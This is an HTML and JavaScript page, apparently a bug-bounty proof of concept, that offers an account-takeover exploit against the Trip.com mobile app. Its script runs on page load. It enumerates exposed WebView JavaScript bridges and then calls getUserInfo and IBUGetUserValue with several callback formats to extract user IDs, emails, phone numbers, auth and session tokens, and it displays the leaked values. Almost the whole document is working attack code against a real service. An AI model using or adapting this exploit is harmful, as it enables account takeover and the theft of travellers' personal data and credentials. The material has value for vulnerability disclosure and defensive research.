<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC v4</title>
    <style>
        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; line-height:1.5; }
        h1 { color:var(--red); text-align:center; font-size:28px; }
        .subtitle { text-align:center; color:#8b949e; margin:8px 0 30px; }
        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
        .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
        .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
        .vulnerable { background:var(--red); color:white; }
        .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
        .data-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
        .data-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
        .data-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:340px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
    </style>
</head>
<body>
    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v4</h1>
    <p class="subtitle">DeepLink → Arbitrary WebView → Exposed JS Bridges (H5UserPlugin + IBUStorageV2)</p>

    <div class="container">
        <!-- Bridges -->
        <div class="card">
            <div class="card-header">Exposed Bridges & All Methods <span id="count" class="status">Scanning...</span></div>
            <div class="bridge-grid" id="bridges"></div>
        </div>

        <!-- Leaked Data -->
        <div class="card">
            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting...</span></div>
            <div class="data-grid" id="data"></div>
        </div>

        <!-- Permission Analysis -->
        <div class="card">
            <div class="card-header">Permission Check & Attack Surface Analysis <span id="perm-status" class="status">Analyzing...</span></div>
            <div id="perm-log" style="background:#000; padding:12px; font-family:monospace; font-size:12px; color:#8b949e;"></div>
        </div>

        <!-- Live Log -->
        <div class="card">
            <div class="card-header">Live Execution Log</div>
            <div class="console" id="console"></div>
        </div>
    </div>

    <script>
        const consoleEl = document.getElementById("console");
        const dataEl = document.getElementById("data");
        const permEl = document.getElementById("perm-log");
        let hasLeak = false;

        function log(msg, type="info") {
            const div = document.createElement("div");
            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
            consoleEl.appendChild(div);
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }

        function render(label, value) {
            if (!hasLeak) { dataEl.innerHTML = ""; hasLeak = true; }
            if (document.getElementById("d-"+label)) return;
            const div = document.createElement("div"); div.className = "data-item"; div.id = "d-"+label;
            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
            div.innerHTML = `<div class="data-label">${label}</div><div class="data-value">${val}</div>`;
            dataEl.appendChild(div);
            document.getElementById("data-status").innerText = "LEAK SUCCESSFUL!";
            document.getElementById("data-status").classList.add("vulnerable");
        }

        window.__bridge_callback = function(base64) {
            try {
                const json = JSON.parse(atob(base64));
                const tag = json.tagname || "unknown";
                log(`Callback → ${tag}`, "success");
                const data = json.param || json.value || json;
                if (data.UserID) {
                    render("UserID", data.UserID);
                    render("Email", data.Email);
                    render("Mobile", data.Mobile);
                    render("Auth", data.Auth);
                    render("Token", data.Token);
                    render("SAuth", data.SAuth);
                }
                if (data.value) render(`Storage ${tag}`, data.value);
            } catch(e){}
        };

        function registerCb(name) {
            window[name] = (res) => { log(`Direct cb ${name} → ${JSON.stringify(res||{}).substring(0,100)}`, "success"); };
            return name;
        }

        function scanBridges() {
            const grid = document.getElementById("bridges");
            let count = 0;
            for (let key in window) {
                if (key.endsWith("_a") && typeof window[key] === "object") {
                    count++;
                    const methods = Object.getOwnPropertyNames(window[key]).filter(m => typeof window[key][m] === "function");
                    const card = document.createElement("div");
                    card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
                    grid.appendChild(card);
                }
            }
            document.getElementById("count").textContent = `${count} Bridges Exposed`;
            document.getElementById("count").classList.add("vulnerable");
        }

        async function exploit() {
            log("=== CRITICAL EXPLOIT STARTED ===", "success");
            permEl.innerHTML += "<div style='color:#f85149'>PermissionIsGranted check is blocking callback (external domain). This proves the attack surface is still exposed via DeepLink.</div>";

            const cb = registerCb("userCb_" + Date.now());

            if (window.User_a) {
                const formats = [cb, JSON.stringify({callback:cb}), JSON.stringify({callbackTagName:cb}), JSON.stringify({tagname:cb}), "{}"];
                formats.forEach(f => {
                    try {
                        window.User_a.getUserInfo(f);
                        log(`getUserInfo called with: ${f.substring(0,70)}...`, "info");
                    } catch(e){}
                });
            }

            if (window.IBUStorageV2_a) {
                const keys = [{b:"user",k:"userInfo"},{b:"common",k:"token"},{b:"common",k:"uid"},{b:"common",k:"vtoken"}];
                keys.forEach(t => {
                    const c = registerCb("store_" + Date.now());
                    const fs = [JSON.stringify({callback:c, bussiness:t.b, key:t.k}), JSON.stringify({callbackTagName:c, bussiness:t.b, key:t.k})];
                    fs.forEach(f => {
                        try { window.IBUStorageV2_a.IBUGetUserValue(f); log(`IBUGetUserValue ${t.k} called`, "info"); } catch(e){}
                    });
                });
            }

            log("All sensitive methods called. If permission was granted (trusted domain), data would appear above.", "success");
        }

        window.onload = () => {
            log("Scanning all bridges...");
            scanBridges();
            setTimeout(exploit, 800);
        };
    </script>
</body>
</html>
